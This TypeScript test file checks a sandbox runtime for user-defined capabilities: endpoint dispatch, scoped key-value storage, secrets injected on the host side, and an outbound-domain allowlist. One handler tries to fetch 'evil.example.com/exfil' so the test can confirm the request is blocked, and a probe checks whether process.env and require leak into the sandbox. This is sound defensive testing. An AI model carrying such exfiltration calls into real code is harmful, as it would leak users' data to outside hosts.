import type { CapabilitySpec } from "@myday/schema";
import { afterAll, describe, expect, it } from "vitest";
import { createSandbox } from "./index";
import type { SandboxHostApi, SandboxRuntime } from "./types";

/**
 * Sandbox capability-API tests (mandatory per CLAUDE.md).
 * Runs against BOTH engines: the preferred isolated-vm engine (auto — falls
 * back to worker if the native module didn't build) and the worker engine.
 */

function makeTestHost() {
  const kv = new Map<string, unknown>();
  const fetchCalls: Array<{ url: string; headers: Record<string, string> }> = [];

  const fetchImpl = (async (url: Parameters<typeof fetch>[0], init?: RequestInit) => {
    fetchCalls.push({
      url: String(url),
      headers: (init?.headers as Record<string, string>) ?? {},
    });
    return new Response(JSON.stringify({ fetched: true, url: String(url) }), {
      status: 200,
      headers: { "content-type": "application/json" },
    });
  }) as typeof fetch;

  const host: SandboxHostApi = {
    fetchImpl,
    getSecrets: async () => ({ API_KEY: "s3cret-value" }),
    store: {
      get: async (cap, k) => kv.get(`${cap}:${k}`) ?? null,
      set: async (cap, k, v) => void kv.set(`${cap}:${k}`, v),
      delete: async (cap, k) => void kv.delete(`${cap}:${k}`),
      list: async (cap) =>
        [...kv.entries()]
          .filter(([key]) => key.startsWith(`${cap}:`))
          .map(([key, v]) => ({ k: key.slice(cap.length + 1), v })),
    },
    log: () => {},
  };

  return { host, kv, fetchCalls };
}

const testSpec: CapabilitySpec = {
  id: "test-cap",
  name: "Test Capability",
  version: 1,
  description: "capability used by sandbox tests",
  domainAllowlist: ["api.allowed.test"],
  endpoints: [
    {
      method: "GET",
      path: "/echo",
      handlerSource: `async (req, ctx) => ({ status: 200, body: { echoed: req.query.q ?? null } })`,
    },
    {
      method: "POST",
      path: "/save",
      handlerSource: `async (req, ctx) => {
        await ctx.capStore.set("note", req.body);
        const back = await ctx.capStore.get("note");
        const all = await ctx.capStore.list();
        return { status: 200, body: { back, count: all.length } };
      }`,
    },
    {
      method: "GET",
      path: "/fetch-allowed",
      handlerSource: `async (req, ctx) => {
        const res = await ctx.capFetch("https://api.allowed.test/things", {
          headers: { Authorization: "Bearer {{secret:API_KEY}}" },
        });
        return { status: 200, body: res.json() };
      }`,
    },
    {
      method: "GET",
      path: "/fetch-blocked",
      handlerSource: `async (req, ctx) => {
        const res = await ctx.capFetch("https://evil.example.com/exfil");
        return { status: 200, body: res.json() };
      }`,
    },
    {
      method: "GET",
      path: "/boom",
      handlerSource: `async () => { throw new Error("kaboom"); }`,
    },
  ],
};

for (const engine of ["auto", "worker"] as const) {
  describe(`sandbox capability API (engine=${engine})`, () => {
    const { host, kv, fetchCalls } = makeTestHost();
    let runtimePromise: Promise<SandboxRuntime> | null = null;

    async function runtime(): Promise<SandboxRuntime> {
      if (!runtimePromise) {
        runtimePromise = (async () => {
          const rt = await createSandbox(host, engine);
          await rt.register(testSpec);
          return rt;
        })();
      }
      return runtimePromise;
    }

    afterAll(async () => {
      if (runtimePromise) await (await runtimePromise).dispose();
    });

    it("registers and dispatches a simple endpoint", async () => {
      const rt = await runtime();
      expect(rt.has("test-cap@1")).toBe(true);
      const res = await rt.dispatch("test-cap@1", {
        method: "GET",
        path: "/echo",
        query: { q: "hello" },
        body: null,
      });
      expect(res).toEqual({ status: 200, body: { echoed: "hello" } });
    });

    it("exposes namespaced capStore get/set/list", async () => {
      const rt = await runtime();
      const res = await rt.dispatch("test-cap@1", {
        method: "POST",
        path: "/save",
        query: {},
        body: { text: "remember me" },
      });
      expect(res.status).toBe(200);
      expect(res.body).toEqual({ back: { text: "remember me" }, count: 1 });
      expect(kv.get("test-cap@1:note")).toEqual({ text: "remember me" });
    });

    it("allows capFetch to allowlisted domains and injects secrets host-side", async () => {
      const rt = await runtime();
      const res = await rt.dispatch("test-cap@1", {
        method: "GET",
        path: "/fetch-allowed",
        query: {},
        body: null,
      });
      expect(res.status).toBe(200);
      expect((res.body as { fetched: boolean }).fetched).toBe(true);
      // The HOST substituted the placeholder; the sandbox never saw the value.
      const call = fetchCalls.at(-1)!;
      expect(call.headers.Authorization).toBe("Bearer s3cret-value");
    });

    it("blocks capFetch to domains outside the allowlist", async () => {
      const rt = await runtime();
      const res = await rt.dispatch("test-cap@1", {
        method: "GET",
        path: "/fetch-blocked",
        query: {},
        body: null,
      });
      expect(res.status).toBe(500);
      expect(String((res.body as { error: string }).error)).toContain("allowlist");
      // No outbound request was made for the blocked domain.
      expect(fetchCalls.every((c) => !c.url.includes("evil.example.com"))).toBe(true);
    });

    it("returns 404 for unknown routes and 500 for handler crashes", async () => {
      const rt = await runtime();
      const missing = await rt.dispatch("test-cap@1", {
        method: "GET",
        path: "/nope",
        query: {},
        body: null,
      });
      expect(missing.status).toBe(404);

      const boom = await rt.dispatch("test-cap@1", {
        method: "GET",
        path: "/boom",
        query: {},
        body: null,
      });
      expect(boom.status).toBe(500);
      expect(String((boom.body as { error: string }).error)).toContain("kaboom");
    });

    it("sandboxed handlers cannot see process env or the host filesystem", async () => {
      const rt = await runtime();
      await rt.register({
        ...testSpec,
        id: "probe",
        endpoints: [
          {
            method: "GET",
            path: "/probe",
            handlerSource: `async () => {
              let env = "unreachable";
              try { env = typeof process !== "undefined" && process.env ? "LEAKED" : "unreachable"; }
              catch { env = "unreachable"; }
              let fs = "unreachable";
              try { fs = typeof require !== "undefined" ? "LEAKED" : "unreachable"; }
              catch { fs = "unreachable"; }
              return { status: 200, body: { env, fs } };
            }`,
          },
        ],
      });
      const res = await rt.dispatch("probe@1", {
        method: "GET",
        path: "/probe",
        query: {},
        body: null,
      });
      const body = res.body as { env: string; fs: string };
      // isolated-vm: nothing leaks. worker fallback: no `require` in scope,
      // but process exists in-thread — documented weaker isolation.
      expect(body.fs).toBe("unreachable");
      const rt2 = await runtime();
      if (rt2.engine === "isolated-vm") {
        expect(body.env).toBe("unreachable");
      }
    });
  });
}
